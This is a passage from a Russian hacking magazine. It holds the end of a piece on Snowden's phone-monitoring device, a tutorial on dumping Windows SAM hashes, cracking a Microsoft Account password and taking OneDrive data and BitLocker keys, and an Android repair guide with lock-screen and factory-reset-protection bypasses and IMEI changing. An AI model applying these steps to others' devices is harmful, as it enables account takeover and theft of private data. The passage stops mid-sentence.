 Bluetooth), и сигнализировать об этом пользователю плюс подавлять актив-
 ность GPS и Wi-Fi, с помощью которых можно отследить местоположение че-
 ловека. Это можно воспринимать как аналог иконок в строке состояния смарт-
 фона, сообщающих о текущей передаче данных по 4G или активности GPS,
 и кнопок для их отключения, реализованных в отдельном устройстве.
   И факт того, что это именно отдельное устройство, а не приложение, кото-
 рое можно установить на смартфон, тут основной. Идея Сноудена в том, что
 доверять нельзя никому, включая производителей смартфонов и разработ-
 чиков мобильных ОС, а следовательно, нельзя считать безопасными ни ПО,
 ни прошивки модулей связи, даже если не говорить о бэкдорах, внедряющих-
 ся глубоко в ОС. В качестве примера он приводит GPS, который начиная с iOS
 8.4 остается активен даже в режиме полета, и модуль Wi-Fi, напряжение на ко-
 тором остается всегда. Нельзя доверять и самому Сноудену, поэтому после
 завершения работы над устройством все спецификации, принципиальные
 схемы и программное обеспечение будут опубликованы в открытом доступе.
   Вопрос только в том, как реализовать такое устройство. Стандартные ме-
 тоды определения активности того же GSM-модуля базируются на мониторин-
 ге радиочастот, что влечет за собой некоторые проблемы, включая возмож-
 ность ложнопозитивных результатов вблизи базовых станций. Плюс данный
 метод никак не защитит от зловредов, которые собирают данные о местопо-
 ложении устройства и отправляют их через определенные интервалы времени
 либо во время звонка или активного использования интернета.
   Исключить саму возможность собирать информацию о местоположении
 можно с помощью джиммера, который будет испускать сигнал GPS, обма-
 нывая смартфон, однако данный метод не особо эффективен в местах уве-
 ренного приема сигнала спутников. К тому же он быстро посадит батарею
 устройства и сам окажется источником сигнала, по которому человека можно
 отследить.
   Для эффективного решения этих проблем Сноуден и Andrew «bunnie»
 Huang предлагают вскрыть смартфон и подключиться к его портам отлад-
 ки. В iPhone 6s такие есть у всех радиомодулей, поэтому можно «на месте»
 узнать о любых фактах передачи данных, а кроме того, физически отключить
 модули Wi-Fi, Bluetooth и GPS, просто сбросив шину WLAN PCI на этапе за-
 грузки смартфона. В результате ОС продолжит нормально работать, но Wi-
 Fi и Bluetooth будут отключены, а GPS, хоть и останется активным, не смо-
 жет получить доступ к антенне, поскольку смартфон использует одну антенну
 как для Wi-Fi, так и для GPS. Чип NFC, который в iPhone пригождается только
 для бесконтактных платежей, планируется отключить полностью, просто отре-
 зав его от антенны.





                           Вывод наружу шины FE1 и FE2 для отладки GSM-модуля





                                    Вывод наружу порта UART для отладки GPS

 В результате должно получиться устройство, которое потребует модификации
 смартфона и вывода нужных контактов наружу (для этого будет использован
 слот для SIM-карт), но зато позволит точно определять факты передачи данных
 или определения местоположения, без ложных срабатываний, а во-вторых, по-
 зволит одним нажатием кнопки полностью отключить Wi-Fi, Bluetooth и GPS.


   Контакты будут выведены наружу
   через слот для SIM-карт





 Кому и зачем понадобятся такие устройства, не совсем понятно. Сноуден го-
 ворит о журналистах, которые работают в горячих точках и нередко становятся
 мишенью для боевиков из-за возможных утечек данных врагу. Как их защитит
 устройство, позволяющее узнать об использовании GSM- или GPS-модуля, —
 неясно. Тут скорее поможет полный офлайн и одноразовые звонилки плюс
 стационарный GPS-навигатор и камера без выхода в сеть.
   Обычным людям такое устройство не нужно и подавно: данные из их
 смартфонов «текут» всегда, и они прекрасно об этом знают, полагаясь на до-
 бросовестность  Apple/Google  и  производителей  смартфонов  (которой,
 естественно, нет). А если уж нужна хоть какая-то анонимность, то лучше после-
 довать совету ребят из Tor Project, которые предлагают во-
 обще не доверять GSM-модулю и пользоваться планшета-
 ми с CyanogenMod и установленным Orbot (Tor для Android),
 а в интернет ходить только через Wi-Fi.
   В любом случае это очень странная идея — пытать-
 ся превратить устройство, изначально предназначенное    WWW
 для связи с внешним миром всеми возможными способа-
                                                                           Опубликованный
 ми, завязанное на облачные сервисы и содержащее множе-                                                                            Сноуденом
 ство проприетарных драйверов и прошивок модулей связи,        документ,
                                                                        объясняющий в стерильное устройство, которое не выдаст его владельца.                                                                            концепцию
 Это все равно что ездить на украденном автомобиле с пе-     устройства (pdf)
 ребитыми номерами.
MOBILE





                                                                               Олег Афонин,
                                                                                        Эксперт по мобильной
                                                                                     криминалистике компании
                                                                                       Элкомсофт
                                                                                                  aoleg@voicecallcentral.com
  BACKUPS
 FOR FUN
AND PROFIT
ЛОМАЕМ РЕЗЕРВНЫЕ
КОПИИ В WINDOWS:
КОМПЬЮТЕРЫ,
ПЛАНШЕТЫ
И ТЕЛЕФОНЫ


Сегодня мы поговорим о резервном копировании
в Windows. Не подумай, мы вовсе не собираемся уныло
обозревать очередную программу, сервис или устройство
для создания резервных копий! Совсем наоборот: мы
рассмотрим механизм, который уже встроен и по умол-
чанию активирован во всех версиях Windows начиная
с Windows 8, и попытаемся понять, можно ли использовать
этот механизм для взлома. В качестве бонуса взломаем
OneDrive и получим доступ к онлайновой учетной записи
Microsoft Account. Поехали!

Признаться, традиционные материалы о резервном копировании в Windows
навевают на меня жуткую тоску еще до того, как я открою текст. Да, данные
надо копировать (зевок). Да, это желательно делать регулярно (уже сводит
скулы). И да, почти никто этим на самом деле не занимается. И не будет —
до тех пор, пока для активации резервного копирования требуются хоть каки-
е-то телодвижения.
  В Apple поняли это первыми и встроили в iOS прекрасный механизм резерв-
ного копирования, который поддерживает актуальную копию данных устрой-
ства в облаке iCloud. Потерял, заменил iPhone или iPad? Авторизуйся со сво-
им Apple ID, и система сама скачает и восстановит актуальные данные. Ничего
не надо настраивать вручную, все работает само по себе. И это прекрасно.
  В Windows так сделать долгое время не получалось. Но в один прекрасный
момент — с выходом восьмой версии системы — в компании Microsoft наконец
решили, что пора это исправить. Как мы помним, именно в Windows 8 для ПК по-
явился режим Metro, который у большинства пользователей ассоциируется
с плиточным интерфейсом. На самом же деле Metro было вовсе не о плитках.
Именно в восьмой версии системы, а вовсе не в «десятке» Microsoft впервые
использовали идеологию универсальных приложений — программ, которые
скачивались и устанавливались из магазина Microsoft, привязывались к учет-
ной записи Microsoft Account и с разрешения разработчиков могли запускаться
как на стационарных компьютерах, так и на планшетах с архитектурой x86 или
ARM и даже на телефонах под управлением Windows Phone.

ПОЗВОЛЬТЕ, НО ПРИ ЧЕМ ЗДЕСЬ РЕЗЕРВНЫЕ КОПИИ?
А резервные копии здесь совсем рядом. Именно в восьмой версии системы
(как полноценной десктопной Windows, так и урезанной планшетной Windows
RT и телефонной Windows Phone) появилась возможность автоматически соз-
давать и поддерживать резервные копии данных как всего устройства в целом,
так и отдельных приложений. Все, что для этого требуется, — использовать
для входа в систему не локальную учетную запись Windows (традиционные ло-
гин и пароль), а учетную запись Microsoft Account (email и пароль). Эта особен-
ность предоставит хакеру целый ряд возможностей — например, можно по-
пробовать взломать пароль от облачной учетной записи пользователя атакой
на хеш от Microsoft Account, который сохраняется на компьютере пользовате-
ля (об этом — ниже).
   Разумеется, возможность создания резервных копий никуда не делась
и в Windows 10, при этом данные совместимы снизу вверх: резервную копию,
созданную на компьютере или телефоне под управлением восьмой версии
Windows, можно запросто и без особых проблем восстановить на десктопе или
смартфоне на «десятке».
   Вот так это выглядит в Windows 10 Mobile:





А вот так — на десктопе:





Минуточку! Ведь на скриншоте с десктопа мы видим настройки синхрониза-
ции, а вовсе не резервного копирования? А что тогда в Settings   Update and
Security   Backup? Как ни странно, резервное копирование настроек систе-
мы, паролей в браузере Edge и Internet Explorer, списка приложений, настро-
ек стартового меню или плиток на планшете — все это сохраняется в облаке
OneDrive именно через настройки синхронизации. Посмотреть, какие именно
устройства сохраняют свои резервные копии в облако, можно через веб-ин-
терфейс OneDrive.





Как видишь, год назад у меня в облаке была парочка телефонов, ноутбук
и планшет под управлением Windows RT. Сейчас парк устройств сменился,
но принцип остался прежним.
   Так, а где тут данные приложений? А здесь начинается самое интересное.
Данные приложений, установленных из магазина Microsoft (универсальных при-
ложений и более старых программ с идеологией Metro), сохраняются в облако
OneDrive автоматически по мере их использования (разумеется, если разреше-
на синхронизация для десктопов и не запрещена для устройств Windows Phone
/ Windows 10 Mobile). Удалил приложение, установил его заново — данные ав-
томатически подтянулись из облака, включая в том числе и маркеры аутенти-
фикации (скажем, заново вводить логин и пароль от сервиса Feedly в моем лю-
бимом новостном клиенте INI Reader после переустановки не приходится — я
сразу попадаю на стартовый экран с моей лентой новостей).
   Попытаться вытащить эти данные из облака — наша задача. Но для нача-
ла нам потребуется получить доступ к облачному хранилищу пользователя —
OneDrive.

ПОЛУЧАЕМ ДОСТУП К ONEDRIVE
Для доступа к OneDrive нам потребуется указать адрес электронной почты
пользователя (@hotmail.com, @live.com или @outlook.com) и его пароль.
И если с первым проблем обычно никаких, то ломиться с подбором паролей
в онлайновый сервис было бы в корне неправильно.
  К счастью, в лобовой атаке нет
никакой  необходимости.  Все,  что
нам потребуется для доступа в обла-
ко, — это компьютер пользователя,
в качестве логина в котором исполь-
зовалась  учетная  запись  Microsoft
Account. Компьютер можно выклю-
ченный. С этого компьютера нам нуж-
но будет извлечь хеш пароля от учет-
ной записи пользователя и провести
атаку в попытке восстановить ориги-
нальный текстовый пароль, который
и будет использоваться для логина
в OneDrive.
   Итак, что нам для этого потребует-
ся? В первую очередь нам нужно за-
грузить компьютер с флешки, на ко-
торую записана среда Windows PE
или что-то на основе Linux. Создать
такую флешку можно самостоятельно
с помощью Rufus, а можно восполь-
зоваться готовым решением класса
Elcomsoft System Recovery.                       Создаем загрузочную флешку
  При использовании бесплатного
Rufus тебе потребуется загрузочный
образ Windows PE, скачать который можно, например, с сайта Microsoft. Не за-
будь записать на ту же флешку утилиту для извлечения хешей паролей к учет-
ным записям — к примеру, Pwdump.
Если же ты создаешь загрузочную флешку на базе Linux, то с извлечением хе-
шей паролей помогут creddump или ophcrack.
  Мы же для удобства воспользуемся Elcomsoft System Recovery. Первый
шаг — создание загрузочной флешки (здесь важно указать правильный тип
загрузчика; доступные варианты — 32-разрядный BIOS и 32- и 64-разрядный
UEFI. Для большинства систем сгодится последний вариант. Для планшетов
с Windows — второй, с 32-битным UEFI. Наконец, для старых систем, в которых
есть режим совместимости с BIOS, можно использовать вариант с BIOS.
  Дальше нужно перегрузить компьютер, зайти в настройки BIOS/UEFI и сде-
лать две вещи: изменить порядок загрузки (так, чтобы компьютер грузился
с флешки, а не с жесткого диска) и отключить Secure Boot, если он включен.
   Загружаем образ Elcomsoft System Recovery (или созданный Rufus’ом за-
грузочный образ). В случае с Elcomsoft нужная утилита запустится автомати-





                                                  Выбираем тип загрузчика


чески. При работе с самостоятельно созданной флешкой тебе придется акти-
вировать режим командной строки и запустить Pwdump. Нас интересует база
данных SAM:





Можно заглянуть внутрь и проверить, присутствует ли в базе нужная учетная
запись Microsoft Account (ее можно отличить по тому, что в качестве логина ис-
пользуется адрес электронной почты пользователя):





Далее выбираем Dump password hashes:





Если используется Pwdump, то достаточно просто запустить его и перенапра-
вить вывод в файл:

pwdump7.exe > dump.txt

Обрати внимание: Pwdump не знает, что такое учетные записи Microsoft
Account, поэтому отобразит соответствующие им локальные аккаунты. Pwdump
можно запускать и на уже загруженном компьютере, но тогда в некоторых слу-
чаях извлечь хеши не получится.





                                                        Запускаем pwdump.exe

На этом данный этап заканчивается; переходим к взлому пароля.

ВЗЛАМЫВАЕМ ПАРОЛЬ ОТ MICROSOFT ACCOUNT
Итак, у нас на руках имеется файл, содержащий хеш от учетной записи
Microsoft Account, которая использовалась для логина в Windows. Универсаль-
ная учетная запись — это отлично, потому что атаковать пароль к облачному
сервису через онлайновую авторизацию — занятие бессмысленное и беспо-
лезное. А вот брутфорс свежеснятого хеша в режиме офлайн — совсем дру-
гое дело!
   Инструментов для взлома паролей — масса. Можно взять, к примеру,
Elcomsoft Distributed Password Recovery, который поддерживает ускорение пе-
ребора с использованием видеокарт AMD и Nvidia (что в 50–100 раз быстрее
в сравнении с перебором силами только центрального процессора) и позво-
ляет выполнять атаки с использованием множества объединенных в сеть ком-
пьютеров.





                                               Elcomsoft Distributed Password Recovery

Впрочем, хватает и других инструментов подобного рода (хоть и без поддерж-
ки ускорения вычислительными ресурсами видеокарты) — хотя бы уже упомя-
нутый ophcrack. Можешь воспользоваться любой из доступных программ. Под-
робно останавливаться на методах подбора паролей по имеющемуся хешу мы
в этой статье не будем; перейдем сразу к самому интересному: для чего это
было нужно.

ИЗВЛЕКАЕМ ДАННЫЕ ИЗ MICROSOFT ACCOUNT
Итак, у нас есть логин и пароль в учетную запись пользователя — Microsoft
Account. Что интересного можно из этого извлечь?
   Очень важная вещь — ключи шифрования  BitLocker, расположенные
по адресу onedrive.live.com/recoverykey. Да-да, Microsoft любезно сохраняет
ключи от криптоконтейнеров BitLocker в своем облаке. Разумеется, сделано
это исключительно для удобства пользователей... и, конечно же, для нашего
удобства — ведь сам пользователь об этом, как правило, не знает. С помо-
щью этих ключей можно спокойно расшифровать зашифрованные диски —
как с использованием Elcomsoft Phone Breaker последней версии, так и про-
сто вводя буквенно-цифровой ключ в ответ на запрос системы при попытке
монтировать зашифрованный раздел.
   Разумеется, доступны все файлы (документы, фотографии) пользователя, ко-
торые синхронизированы с OneDrive со всех устройств (а не только с того, на ко-
тором мы взламывали пароль). Доступна почта Hotmail/Live.com/Outlook.com.
  А что с резервными копиями? По ссылке DeviceBackups можно просмо-
треть список резервных копий всех зарегистрированных в учетной записи
устройств. Здесь будут собраны все компьютеры и планшеты под управле-
нием Windows 8, 8.1, 10 и RT. Здесь же будут и резервные копии смартфонов
на Windows Phone 8 и 8.1, а также устройств на Windows 10 Mobile.
   Посмотреть-то мы можем, можем даже удалить, но скачать не получится:
соответствующий механизм не предусмотрен. К сожалению, и инструментов
для скачивания бэкапов целиком сейчас нет. Однако какую-то часть данных
извлечь все-таки можно.
   Для этого нам потребуется Elcomsoft Phone Breaker. Устанавливаем, ав-
торизуемся (вводим логин и пароль от Microsoft Account), выбираем каталог,
куда будут скачаны данные. Через несколько минут все готово:





Улов есть, но что именно нам попалось? В ZIP-архиве, который был создан,
содержатся три базы данных в формате SQLite: это заметки, контакты и исто-
рия звонков и сообщений. Можно просматривать БД в формате SQLite с по-
мощью одной из множества бесплатных программ, а можно воспользоваться
Elcomsoft Phone Viewer:





Вот так, к примеру, выглядят контакты:





На данный момент это все, что можно извлечь из резервных копий устройств
под управлением Windows. А как же данные приложений, настройки устройств,
список установленных программ? Добраться до них пока нельзя: резервные
копии зашифрованы, а перехватить ключ шифрования пока что не получилось.

ЗАКЛЮЧЕНИЕ
Этой статьей мы завершаем цикл публикаций о резервных копиях мобильных
устройств. Начиная с восьмой версии в Windows появилась внятная и удоб-
ная система резервного копирования, по удобству использования сравнимая
с реализацией от Apple. При этом Windows — гораздо более сложная и откры-
тая платформа, чем iOS; разработать и реализовать сопоставимую с Apple
систему синхронизации и резервного копирования данных наверняка было
сложнее.
   Уникальная особенность Windows — сохранение данных приложений в об-
лако независимо от резервных копий как таковых. Установил приложение, по-
пользовался, удалил; установил снова (даже на другом устройстве) — данные
приложения автоматически восстановились. Удобно!
   Работает, впрочем, вся эта система в основном для «новых», «метрош-
ных» и универсальных приложений, которые устанавливаются через магазин
Windows. Зато и реализована она совершенно прозрачно как для смартфонов
и планшетов, так и для ноутбуков и десктопов.
  А вот к безопасности резервных копий есть вопросы. Точнее, единствен-
ный вопрос. Из-за открытости системы существует практическая возможность
взлома пароля от онлайновой учетной записи Microsoft Account с помощью пе-
ребора в режиме офлайн. Подобных уязвимостей у Apple iOS просто нет. Одна-
ко в целом резервными копиями Windows пользоваться просто и удобно, а во-
прос безопасности надежно решается установкой длинного и сложного пароля
к Microsoft Account (а чтобы не вводить его каждый раз — достаточно в настрой-
ках Windows указать короткий PIN-код для быстрого входа в систему).
MOBILE


    ВРАГОВ
     ANDROID             ВОЗВРАЩАЕМ СМАРТФОН11К ЖИЗНИ В САМЫХ РАЗНЫХ
              СИТУАЦИЯХ




Мобильные устройства настолько тесно
переплелись с повседневной жизнью, что
отсутствие смартфона под рукой может
вызвать панику. А уж если он сломался, то         Дмитрий «BRADA»                                                                                Подкопаев
и говорить нечего. Для многих это грозит          john.brada.doe@gmail.com
потерей тысяч нервных клеток. В этой ста-
тье мы рассмотрим способы восстановления работоспо-
собности устройства при некоторых «поломках», научимся
частично восстанавливать его функции до покупки нового
и доставать важную информацию из разбитого телефона.

Идеальный вариант для описанных в статье рецептов —
это телефон с разблокированным загрузчиком, установ-
ленным кастомным рекавери TWRP (CWM давно не об-
новляется), с наличием прав root и галочкой «Отладка
по USB» в настройках для разработчиков. Такая мелочь,
как эта самая галочка, позволит в случае разбитого экра-
на не только вытащить данные с карты памяти, но и до-         INFO
стать базы контактов или СМС, используя плагин ADB                                                                      Чтобы попасть в раздел
для Total Commander.                                                «Для разработчиков»,
   Рекомендую проделать эти манипуляции сразу, что-     нужно семь раз тапнуть
                                                                         на номер сборки в менюбы не было мучительно больно, когда возникнут пробле-                                                                        «О телефоне».
мы с телефоном. Все примеры будут даны для Nexus 5,
как самого распространенного эталонного Android-смартфона.

ПРОБЛЕМА #1. ТЕЛЕФОН НЕ ЗАГРУЖАЕТСЯ
Начнем с наиболее частых проблем. Телефон перестал загружаться. Посто-
янно висит логотип Google, и дальше дело не идет. Имеем классический бут-
луп (bootloop — загрузка по кругу). Может наступить после ежемесячного об-
новления безопасности устройства
даже у пользователей со стоковой
прошивкой, которые никогда не лез-
ли в систему. Решений три:
•  сделать сброс из стокового река-
   вери (приведет к потере всех дан-
   ных) или из TWRP (данные не про-
   падут);
•  прошить из стокового рекавери
   через sideload полный ОТА-об-
   раз в формате ZIP, который с мая
   Google начала выкладывать
   для общего пользования, чем
   очень упростила жизнь многим
   пользователям (данные не про-
   падут);
•  прошить полный образ прошивки,
   предварительно убрав -w
                                        Прошивка полного образа на Nexus 7
   из скрипта flash-all.bat, чтобы                                             через flash-all.bat без параметра -w
   не потерять данные.

ПРОБЛЕМА #2. ТЕЛЕФОН НЕ ВКЛЮЧАЕТСЯ
При полной разрядке аккумулятора телефон может не включиться даже по-
сле подсоединения зарядника: при достижении нескольких процентов заряда
смартфон начнет загрузку, во время которой опустошит батарею и вновь от-
ключится. Решений может быть несколько.
•  Подключить зарядник от другого устройства с большим током, в идеале 2А.
•  Зайти в загрузчик (обычно громкость вниз + питание), далее кнопкой «Пи-
   тание» подтверждаем выбранный пункт Start. Если не помогает, то в ре-
  жиме загрузчика выбирать громкостью Power down, затем подтвердить
   кнопкой питания. Далее следует отсоединить зарядное устройство и под-
   соединить его снова в течение десяти секунд. На экране должен появиться
   значок батареи. После этого можно пробовать включать устройство, пред-
   варительно дав ему зарядиться не менее часа. Подробнее можно прочи-
   тать на официальной странице поддержки.
•  Запитать смартфон от USB-выхода компа с помощью самопальной лягуш-
   ки. Для этого достаточно найти любой USB-кабель (подойдет и от мыш-
    ки), отрезать его, а затем присоединить красный провод к плюсу батареи,
   а черный — к минусу. Далее батарею следует поставить на место (с присо-
   единенными проводами) и включить смартфон.





                                            Красный — плюс, черный — минус


ПРОБЛЕМА #3. ТЕЛЕФОН НЕ ЗВОНИТ
Если не удается совершить звонок или смартфон вообще не видит мобиль-
ную сеть, то прежде всего следует проверить IMEI. Сделать это можно, набрав
*#06#. Если вместо номера высветились нули, то IMEI слетел. Проще все-
го восстановить его из бэкапа, поэтому рекомендую сделать его после про-
чтения статьи и закинуть в облако. В Play Market есть очень много программ
для создания и восстановления таких бэкапов, поэтому останавливаться
на них не буду. Сделать то же самое можно и руками. Например, для Nexus 4
в эмуляторе терминала или из консоли нужно ввести следующие команды:
   Бэкап IMEI:

$ adb shell
> su
> dd if=/dev/block/mmcblk0p8 of=/sdcard/m9kefs1.img
> dd if=/dev/block/mmcblk0p9 of=/sdcard/m9kefs2.img

Восстановление IMEI:

$ adb shell
> su
> dd if=/sdcard/m9kefs1.img of=/dev/block/mmcblk0p8
> dd if=/sdcard/m9kefs2.img of=/dev/block/mmcblk0p9

У Nexus 5 нет отдельного раздела EFS. Поэтому бэкапить надо целиком раз-
делы 12 и 13:

$ adb shell
> su
> dd if=/dev/block/mmcblk0p12 of=/sdcard/modemst1.img
> dd if=/dev/block/mmcblk0p13 of=/sdcard/modemst2.img

Восстановление проводится так:

$ adb shell
> su
> dd if=/sdcard/modemst1.img of=/dev/block/mmcblk0p12
> dd if=/sdcard/modemst2.img of=/dev/block/mmcblk0p13

Но что же делать, если бэкапа нет? Способ восстановления IMEI найдется
и в этом случае. Нужны наборы утилит EFS Professional и QPST, а также драйверы
Qualcomm для твоего устройства. Сначала грузится модифицированное ядро,
затем телефон перегружается в диагностический режим командами

$ adb shell
> su
> setprop sys.usb.config diag,adb

После этого IMEI можно менять. Подробную инструкцию найдешь тут. Если нет
под рукой коробки, то IMEI можно узнать у Гугла в личном кабинете на вкладке
Android.
   Дополнительно понадобится узнать SPC code — шестизначное число, не-
обходимое для работы сервисных программ. Сделать это можно следующим
образом. Качаем из маркета и запускаем Nexus 5 Field Test Mode, нажима-
ем три точки, далее Settings (view), потом выбираем LTE, edit, выпрыгнет окно
с запросом кода. После этого в консоли надо ввести:

> adb shell
> logcat -d | grep "commandId\ 200"

Ответом будут строки вида:

> 08-02 10:16:27.140 14401 14401 D LG_SVC_ITEMS:
    getCommands commandId 200-START
> 08-02 10:16:27.185 14401 14401 D LG_SVC_ITEMS:
    getCommands commandId 200 = 353662-END

где шесть цифр в конце и есть искомый код.





                                       Вкладка Android с IMEI в личном кабинете





                                      Подключение программы EFS Professional





              Работа утилиты Qualcomm NV Tools, входящей в комплект EFS Professional


ПРОБЛЕМА #4. НЕ РАБОТАЕТ ТАЧСКРИН
Если неудачно уронить телефон, можно повредить экран
и, как следствие, тачскрин. В этом случае поможет мыш-
ка, подключенная к смартфону через переходник USB-
OTG. Можно также подключить устройство к компу и ис-                                                        INFO
пользовать для управления консоль и ADB, о чем я писал
в статье «Консольный Android». ADB позволит не только     С помощью того
запускать приложения, отправлять СМС и даже совер-      же QPST можно
                                                                                активироватьшать звонки, но и эмулировать нажатия на экран. Коман-                                                                              на Nexus 5
ды выглядят следующим образом:                                   американской
•  text <строка> — ввести строку;                               модели D820 частоты
                                                                                   LTE, пригодные•  keyevent <код_клавиши> —  эмулировать нажатие                                                                           для использования
   хардварной кнопки;                                                                                  в Европе.
•  tap <x> <y> — тап по указанному месту экрана;
•  swipe <x1> <y1> <x2> <y2> — свайп от x1, y1 до x2, y2.

Например, вытянуть шторку с уведомлениями можно так (отсчет координат
идет от левого верхнего угла):

$ input swipe 10 10 10 1000

На экране разрешением 1080 х 1920 нажать на кнопку «Меню приложений»
стандартного лаунчера от Гугла, которая находится над кнопкой «Домой»,
можно так:

$ input touchscreen tap 500 1775

Если же не работает только часть экрана, можно произвольно сдвинуть вы-
водимое изображение через консольную команду wm overscan или прогой
Screen Shift.

ПРОБЛЕМА #5. НЕ РАБОТАЕТ USB
Если по USB телефон заряжается, но при подключении комп не видит устрой-
ство, можно совершать манипуляции с телефоном через Wi-Fi. Для этого нуж-
ны права root и приложение WiFi ADB. Запускаем приложение, жмем кнопку
и подключаемся к смартфону с помощью команды connect и показанного при-
ложением IP-адреса:

$ adb connect IP-адрес

Полное руководство по работе с ADB, повторюсь, есть в статье «Консоль-
ный Android». В качестве более удобной альтернативы можно использовать
AirDroid.

ПРОБЛЕМА #6. НЕ РАБОТАЕТ КНОПКА ПИТАНИЯ
Если в смартфоне сломалась кнопка питания, включить его можно так: зажи-
маем громкость вниз и подключаем проводом к компу. Попадаем в загрузчик.
Из консоли вводим команду для продолжения загрузки (fastboot входит в со-
став Android SDK, папка platform-tools):

$ fastboot continue

Телефон загрузится. Для обеспечения работоспособности можно поставить
модуль GravityBox для Xposed framework и включить опцию «Пробуждение
громкостью» или поставить ядро с поддержкой DoubleTap2Wake. Чтобы иметь
возможность погасить экран (заблокировать), следует активировать опцию
«Двойное нажатие для сна» в GravityBox.
   Другие хардварные кнопки можно переназначить, отредактировав один
из файлов /system/usr/keylayout. На Nexus 5 хардварных кнопок немного, поэ-
тому приведу пример со смартфоном Micromax Q415. У него очень неудачное
расположение кнопок «Назад» и «Меню», но их легко поменять местами, если
отредактировать файл ft5x06_ts.kl:

key 158    BACK
key 139    APP_SWITCH
key 172    HOME
key 217    SEARCH
key 249    MENU

Достаточно в первой строке указать кейкод 249, а в последней — 158. Анало-
гичным образом можно изменить любые другие кнопки, включая кнопки гром-
кости (их настройки могут находиться в другом файле).

ПРОБЛЕМА #7. ТЫ ЗАБЫЛ PIN-КОД
Допустим, ты забыл PIN или не совсем трезвым поставил графический ключ, ну
или друзья пошутили и включили распознавание по лицу. Так вот, если устрой-
ство по какой-то причине заблокировано, блокировку можно снять (при усло-
вии включенной отладки по USB и прав root) через ту же консоль:

$ adb shell
> su
> cd /data/system
> rm *.key

Команда удалит все пароли и графические ключи. Сами файлы, в зависимости
от прошивки и модели устройства могут быть: gesture.key, password.key, cm_
gesture.key, personalpattern.key, personalbackuppin.key. Также за блокировку от-
вечают файлы locksettings.db, locksettings.db-shm, locksettings.db-wal.
   После этого достаточно перегрузить устройство и ввести любой ключ, па-
роль. Если это не помогает, можно попробовать следующее:

$ adb shell
> cd /data/data/com.android.providers.settings/databases
> sqlite3 settings.db
> update system set value=0
    where name='lock_pattern_autolock';
> update system set value=0
    where name='lockscreen.lockedoutpermanently';


ПРОБЛЕМА #8. ЗАПРОС АККАУНТА GOOGLE ПОСЛЕ СБРОСА
ДО ЗАВОДСКИХ НАСТРОЕК
На всех Нексусах, начиная с Nexus 6, а также на многих современных телефо-
нах Google и производители ввели новую систему защиты данных пользовате-
ля, получившую название Factory Reset Protection (FRP). Теперь после сброса
устройства до заводских настроек, на этапе начальной настройки у пользо-
вателя потребуют ввести данные (адрес почты и пароль) от предыдущего ак-
каунта, к которому привязан телефон.
По мнению Google, такая защита дела-
ет бессмысленным воровство телефо-
на: злоумышленник, который не суме-
ет подобрать пароль, сможет сбросить
устройство до заводских настроек че-
рез стоковый рекавери, но при загрузке
упрется в этот экран.
Но что же делать честным пользова-
телям,  которые забыли  логин и  па-
роль на устройстве? Настроил ты теле-
фон родителям и благополучно забыл
почту с паролем. На выручку придет
канал  YouTube  сайта  Rootjunky.com.
На канале множество видеоинструкций
по обходу защиты на разных устрой-
ствах,  включая  обновление  безопас-
ности от 1 июня 2016 года и прошивки
Android N developer preview 4. Сводятся
они к тому, что необходимо добраться
до браузера, скачать и установить прогу
QuickShortcutMaker, найти в ней Google
Account Manager, выбрать Type Email and
Password, нажать Try, три точки, далее
Browser sign-in. После чего можно вво-
дить данные любого аккаунта и перегру-
                                               Запрос предыдущего аккаунта
жать устройство. Запустившийся мастер                                              при сбросе до заводских настроек
настройки уже не будет требовать Verify
your account.

ПРОБЛЕМА #9. НЕ РАБОТАЕТ МОБИЛЬНАЯ СВЯЗЬ, WI-FI, ОТВАЛИВА-
ЕТСЯ КАРТА ПАМЯТИ
Если телефон начинает дико глючить с постоянным отваливанием различных
приложений, с последующим бутлупом и возможностью прошивки только 4.4.4
(все, что выше, не загружается), то, скорее всего, на устройстве слетел раздел
/persist. Для Nexus 5 это раздел 16, у Nexus 9 — 11, у Nexus 6 — 26.
   Чтобы вернуть смартфон в нормальное состояние, необходимо отформа-
тировать раздел командой (на примере Nexus 5)

$ adb shell make_ext4fs /dev/block/mmcblk0p16

После этого аппарат должен заработать нормально. Единственный минус —
каталог /persist окажется пустым, и при каждой перезагрузке будут меняться
MAC-адреса на Wi-Fi и Bluetooth. Если это критично, то можно предпринять
дополнительные шаги:
1. Скачиваем файлы.
2. Устанавливаем HexEditor.
3. Произвольно меняем значения у двух файлов в архиве.
4. Внутри /persist создаем папку bluetooth.
5. С помощью проводника, например ES File Explorer, меняем свойства пап-
   ки (нужен рут и показ скрытых файлов в настройках): owner — bluetooth,
   group — system, permissions — -rwxrwx---.
6. Внутри /persist создаем папку  wifi и аналогично выставляем свойства:
   owner — wifi, group — system, permissions — -rwxrwx---.
7. Закидываем файлы из архива в созданные папки: .bdaddr в bluetooth
   и .macaddr в wifi.
8. Меняем разрешения у файлов на 660 (-rw-rw---).
9. Перегружаем устройство.

ПРОБЛЕМА #10. ЧЕРНЫЙ ЭКРАН
ПРИ ВКЛЮЧЕНИИ
Если устройство не загружается и не пу-
скает даже в загрузчик, показывая толь-
ко черный экран, но при этом реагиру-
ет звуком на подключение к компу, то
это верный признак, что слетела табли-
ца разделов или загрузчик (что по сути
одно и то же). Вся прелесть устройств
Nexus заключается в том, что у них есть
резервный загрузчик, который позволит
не только оживить смартфон, но и вос-
становить основной загрузчик.
   Включаем смартфон через резерв-
ный загрузчик, удерживая кнопки VolUp
+ VolDown + Power (сработает, толь-
                                              Вывод разделов Nexus 5
ко если убит основной загрузчик). Ког-                                                          с помощью эмулятора терми-
да система загрузится, подключаемся            нала на прошивке ниже 6.0
по ADB и восстанавливаем основной
загрузчик простым копированием ре-
зервного:

$ adb shell
> su
> dd if="/dev/block/mmcblk0p15" of="/dev/block/mmcblk0p12" // Nexus 4
> dd if="/dev/block/mmcblk0p11" of="/dev/block/mmcblk0p6" // Nexus 5
> dd if="/dev/block/mmcblk0p13" of="/dev/block/mmcblk0p7" // Nexus 6


ПРОБЛЕМА #11. QHSUSB_BULK
Если телефон не загружается и при подключении к компу в диспетчере
устройств определяется как QHSUSB_BULK с восклицательным знаком в жел-
том треугольнике, паниковать не стоит. Обычно проблему можно поправить.
   Чтобы выдернуть из устройства данные, необходимо первым делом скачать
актуальную версию Ext2fsd, установить ее и перегрузить комп. После после-
дующего запуска проги в открывшемся окне находим диск, соответствующий
объему телефона. На этом диске нажимаем правой кнопкой и выбираем ext2
Management. В открывшемся меню ставим галочки: Mount volume in readonly
mode и Autonatically mount via Ext2Mgr (напротив выбираем букву диска). По-
сле чего можно нажать Apply и вытаскивать информацию через проводник или
Total Commander.
   Чтобы  восстановить  работоспособность  телефона, необходимо  ска-
